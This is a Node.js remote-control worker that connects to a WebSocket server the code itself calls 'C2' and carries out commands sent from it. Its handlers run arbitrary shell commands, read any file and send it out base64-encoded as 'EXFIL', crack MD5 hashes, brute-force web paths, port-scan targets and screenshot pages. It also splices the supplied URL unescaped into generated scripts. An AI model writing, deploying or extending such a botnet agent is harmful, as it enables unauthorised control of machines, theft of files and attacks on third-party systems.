const WebSocket = require('ws');
const crypto = require('crypto');
const fs = require('fs');
const { exec } = require('child_process'); 
const net = require('net');
const path = require('path');

// --- CONFIGURATION ---
const ACCESS_KEY = process.env.ACCESS_KEY;
if (!ACCESS_KEY) { 
    console.error("Error: ACCESS_KEY not found."); 
    process.exit(1); 
}

const WEBSOCKET_URL = `wss://scavenger-brain.onrender.com?key=${ACCESS_KEY}`;

// --- MAIN LOOP ---
function connect() {
    const ws = new WebSocket(WEBSOCKET_URL);

    function logToC2(msg) {
        try { 
            ws.send(JSON.stringify({ type: 'SHELL_LOG', output: msg })); 
        } catch(e){}
        console.log(msg);
    }

    ws.on('open', () => { 
        console.log("Connected to C2."); 
        ws.send(JSON.stringify({ type: 'REGISTER_WORKER' })); 
    });

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);

            // 1. MINING JOB
            if (msg.type === 'MINING_JOB') {
                crack(ws, msg.start, msg.end, msg.target);
            } 
            // 2. KILL SWITCH
            else if (msg.type === 'STOP') {
                logToC2(`[SYSTEM] Target neutralized: ${msg.solution}. Standing by.`);
            }
            // 3. PROXY MODULE
            else if (msg.type === 'HTTP_PROXY') {
                logToC2(`[PROXY] Routing request to: ${msg.url}`);
                fetch(msg.url)
                    .then(async (response) => {
                        const text = await response.text();
                        ws.send(JSON.stringify({ 
                            type: 'PROXY_RESULT', 
                            requestId: msg.requestId, 
                            status: response.status, 
                            body: text.substring(0, 500) + "..." 
                        }));
                    })
                    .catch(err => { logToC2(`[PROXY ERROR] ${err.message}`); });
            }
            // 4. SHELL EXECUTION
            else if (msg.type === 'EXEC_CMD') {
                logToC2(`[SHELL] Executing: ${msg.command}`);
                exec(msg.command, { timeout: 10000 }, (error, stdout, stderr) => {
                    ws.send(JSON.stringify({ 
                        type: 'SHELL_RESULT', 
                        output: stdout || stderr || (error ? error.message : "Done.") 
                    }));
                });
            }
            // 5. EXFILTRATION
            else if (msg.type === 'EXFIL_CMD') {
                logToC2(`[EXFIL] Extracting: ${msg.path}`);
                if (fs.existsSync(msg.path)) {
                    try {
                        const fileData = fs.readFileSync(msg.path, { encoding: 'base64' });
                        ws.send(JSON.stringify({ 
                            type: 'EXFIL_RESULT', 
                            filename: msg.path.split('/').pop(), 
                            data: fileData 
                        }));
                    } catch (e) { logToC2(`[EXFIL ERROR] Read failed: ${e.message}`); }
                } else { logToC2(`[EXFIL ERROR] File not found: ${msg.path}`); }
            }
            // 6. SNAPSHOT (PUPPETEER)
            else if (msg.type === 'SNAPSHOT_CMD') {
                logToC2(`[EYE] Spying on: ${msg.url}`);
                const script = `const puppeteer=require('puppeteer');(async()=>{try{const browser=await puppeteer.launch({args:['--no-sandbox']});const page=await browser.newPage();await page.setViewport({width:1280,height:720});await page.goto('${msg.url}',{waitUntil:'networkidle2',timeout:30000});await page.screenshot({path:'evidence.png'});await browser.close();}catch(e){console.error(e);}})();`;
                fs.writeFileSync('camera.js', script);
                const cmd = `npm list puppeteer || npm install puppeteer && node camera.js`;
                exec(cmd, { timeout: 60000 }, (error, stdout, stderr) => {
                    if (fs.existsSync('evidence.png')) {
                        const fileData = fs.readFileSync('evidence.png', { encoding: 'base64' });
                        ws.send(JSON.stringify({ 
                            type: 'EXFIL_RESULT', 
                            filename: `snapshot_${Date.now()}.png`, 
                            data: fileData 
                        }));
                    } else { logToC2(`[EYE ERROR] Snapshot failed.`); }
                });
            }
            // 7. CRYPTO SNIPER
            else if (msg.type === 'SNIPE_CMD') {
                const ticker = msg.ticker.toLowerCase();
                logToC2(`[SNIPER] Checking price for: ${ticker}`);
                const targetUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${ticker}&vs_currencies=usd&include_24hr_change=true`;
                fetch(targetUrl).then(async (res) => {
                        const json = await res.json();
                        if (json[ticker]) {
                            const price = json[ticker].usd;
                            const change = json[ticker].usd_24h_change.toFixed(2);
                            ws.send(JSON.stringify({ 
                                type: 'SNIPE_RESULT', 
                                ticker: ticker, 
                                mentions: `Price: $${price} (${change}%)` 
                            }));
                        } else { logToC2(`[SNIPER] Token '${ticker}' not found on CoinGecko.`); }
                    }).catch(err => { logToC2(`[SNIPER ERROR] API fail: ${err.message}`); });
            }
            // 8. MAPPER (WORDLIST)
            else if (msg.type === 'MAP_CMD') {
                const target = msg.url.replace(/\/$/, ""); 
                const workerId = parseInt(process.env.WORKER_ID) || 1;
                const wordlistUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt';
                fetch(wordlistUrl).then(async (res) => {
                    const text = await res.text();
                    const lines = text.split('\n');
                    const chunkSize = Math.ceil(lines.length / 20);
                    const start = (workerId - 1) * chunkSize;
                    const myChunk = lines.slice(start, start + chunkSize);
                    logToC2(`[MAP] Unit ${workerId} scanning sector ${start}-${start+chunkSize}...`);
                    for (const path of myChunk) {
                        if (!path) continue;
                        try {
                            const scanUrl = `${target}/${path}`;
                            const check = await fetch(scanUrl, { method: 'HEAD' }); 
                            if (check.status === 200 || check.status === 403) {
                                ws.send(JSON.stringify({ 
                                    type: 'MAP_RESULT', 
                                    path: path, 
                                    status: check.status, 
                                    url: scanUrl 
                                }));
                            }
                        } catch (err) {}
                    }
                    logToC2(`[MAP] Unit ${workerId} sector scan complete.`);
                }).catch(err => logToC2(`[MAP ERROR] Wordlist fetch failed.`));
            }
            // 9. PORT SCANNER
            else if (msg.type === 'SCAN_CMD') {
                const target = msg.ip;
                const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5900, 6379, 8080, 27017]; 
                const workerId = parseInt(process.env.WORKER_ID) || 1;
                const myPorts = ports.filter((_, index) => (index % 20) === (workerId - 1));
                if (myPorts.length > 0) logToC2(`[SCAN] Unit ${workerId} checking ports: ${myPorts.join(',')}`);
                myPorts.forEach(port => {
                    const socket = new net.Socket();
                    socket.setTimeout(2000); 
                    socket.on('connect', () => { 
                        ws.send(JSON.stringify({ type: 'SCAN_RESULT', port: port, status: 'OPEN', ip: target })); 
                        socket.destroy(); 
                    });
                    socket.on('timeout', () => { socket.destroy(); });
                    socket.on('error', (err) => { socket.destroy(); });
                    socket.connect(port, target);
                });
            }
            // 10. ARCHIVER
            else if (msg.type === 'ARCHIVE_CMD') {
                logToC2(`[ARCHIVE] Preserving: ${msg.url}`);
                const script = `const puppeteer=require('puppeteer');(async()=>{try{const browser=await puppeteer.launch({args:['--no-sandbox']});const page=await browser.newPage();await page.setViewport({width:1920,height:1080});await page.goto('${msg.url}',{waitUntil:'networkidle0',timeout:60000});const pdfName='archive_'+Date.now()+'.pdf';await page.pdf({path:pdfName,format:'A4',printBackground:true});await browser.close();console.log(pdfName);}catch(e){console.error(e);}})();`;
                fs.writeFileSync('archiver.js', script);
                const cmd = `npm list puppeteer || npm install puppeteer && node archiver.js`;
                exec(cmd, { timeout: 90000 }, (error, stdout, stderr) => {
                    const filename = stdout.trim();
                    if (filename && fs.existsSync(filename)) {
                        const fileData = fs.readFileSync(filename, { encoding: 'base64' });
                        ws.send(JSON.stringify({ 
                            type: 'EXFIL_RESULT', 
                            filename: filename, 
                            data: fileData 
                        }));
                    } else { logToC2(`[ARCHIVE ERROR] PDF gen failed.`); }
                });
            }
            // 11. SPIDER: SCOUT (FIXED FOR RELATIVE LINKS)
            else if (msg.type === 'SPIDER_SCOUT') {
                logToC2(`[SPIDER] Scouting target: ${msg.url}`);
                let baseUrl;
                try { baseUrl = new URL(msg.url); } catch(e) { baseUrl = null; }

                fetch(msg.url)
                    .then(async (res) => {
                        const html = await res.text();
                        // Improved Regex to find all hrefs (absolute AND relative)
                        const linkRegex = /href=["']([^"']+)["']/g;
                        const links = [];
                        let match;
                        
                        while ((match = linkRegex.exec(html)) !== null) {
                            let link = match[1];
                            // If it's a relative link (starts with /), attach the domain
                            if (link.startsWith('/') && baseUrl) {
                                link = baseUrl.origin + link;
                            }
                            // Only keep http links
                            if (link.startsWith('http')) {
                                links.push(link);
                            }
                        }
                        
                        // Filter duplicates
                        const uniqueLinks = [...new Set(links)].slice(0, 100);
                        ws.send(JSON.stringify({ 
                            type: 'SPIDER_SCOUT_RESULT', 
                            links: uniqueLinks, 
                            base: msg.url 
                        }));
                    })
                    .catch(err => logToC2(`[SPIDER ERROR] Scout failed: ${err.message}`));
            }
            // 12. SPIDER: AUDITOR
            else if (msg.type === 'SPIDER_AUDIT') {
                const target = msg.url;
                const start = Date.now();
                fetch(target, { method: 'HEAD' })
                    .then((res) => {
                        const latency = Date.now() - start;
                        ws.send(JSON.stringify({ 
                            type: 'SPIDER_AUDIT_RESULT', 
                            url: target, 
                            status: res.status, 
                            latency: latency 
                        }));
                    })
                    .catch(err => { 
                        ws.send(JSON.stringify({ 
                            type: 'SPIDER_AUDIT_RESULT', 
                            url: target, 
                            status: 'ERR', 
                            latency: 0 
                        })); 
                    });
            }
            // 13. STUDIO MODE (CONTENT PIPELINE)
            else if (msg.type === 'STUDIO_CMD') {
                logToC2(`[STUDIO] Initializing Production Pipeline...`);
                
                // 1. Install Dependencies (Quietly)
                const installCmd = "pip install pygame neat-python numpy scipy imageio moviepy google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client";
                
                exec(installCmd, { timeout: 300000 }, (err, stdout, stderr) => {
                    if (err) {
                        logToC2(`[STUDIO ERROR] Dep Install Failed: ${err.message}`);
                        return;
                    }
                    logToC2(`[STUDIO] Dependencies installed. Running Simulation...`);

                    // 2. Run the AI Simulation (Brain)
                    exec("python3 brain.py", { timeout: 1200000 }, (err2, stdout2, stderr2) => {
                        if (err2) {
                            logToC2(`[STUDIO ERROR] Simulation Failed: ${err2.message}`);
                            logToC2(`[DEBUG] ${stdout2.substring(0, 200)}`);
                            return;
                        }
                        
                        logToC2(`[STUDIO] Training Complete. Starting Editor...`);

                        // 3. Run the Editor (Stitch & Upload)
                        const env = { 
                            ...process.env, 
                            YT_CLIENT_ID: process.env.YT_CLIENT_ID,
                            YT_CLIENT_SECRET: process.env.YT_CLIENT_SECRET,
                            YT_REFRESH_TOKEN: process.env.YT_REFRESH_TOKEN,
                            SDL_VIDEODRIVER: 'dummy',
                            SDL_AUDIODRIVER: 'dummy'
                        };

                        exec("python3 editor.py", { env: env, timeout: 600000 }, (err3, stdout3, stderr3) => {
                            if (err3) {
                                logToC2(`[STUDIO ERROR] Editing Failed: ${err3.message}`);
                                logToC2(`[DEBUG] ${stdout3.substring(0, 200)}`);
                            } else {
                                logToC2(`[STUDIO SUCCESS] Video Generated! Sending copy...`);
                                // Send the final file back to dashboard
                                const videoFile = 'evolution_35s.mp4';
                                if (fs.existsSync(videoFile)) {
                                    const fileData = fs.readFileSync(videoFile, { encoding: 'base64' });
                                    ws.send(JSON.stringify({ 
                                        type: 'EXFIL_RESULT', 
                                        filename: `video_${Date.now()}.mp4`, 
                                        data: fileData 
                                    }));
                                }
                            }
                        });
                    });
                });
            }

        } catch (e) { console.error("Error processing message:", e); }
    });

    ws.on('close', () => setTimeout(connect, 5000));
    ws.on('error', () => ws.close());
}

function crack(ws, start, end, targetHash) {
    for (let i = start; i < end; i++) {
        const guess = i.toString(); 
        const hash = crypto.createHash('md5').update(guess).digest('hex');
        if (hash === targetHash) {
            ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: guess, hash: hash }));
            return;
        }
    }
    ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: null }));
}

// Keep connection alive
setInterval(() => { console.log(`[HEARTBEAT] System Vitality: 100%`); }, 60000); 

// Start
connect();
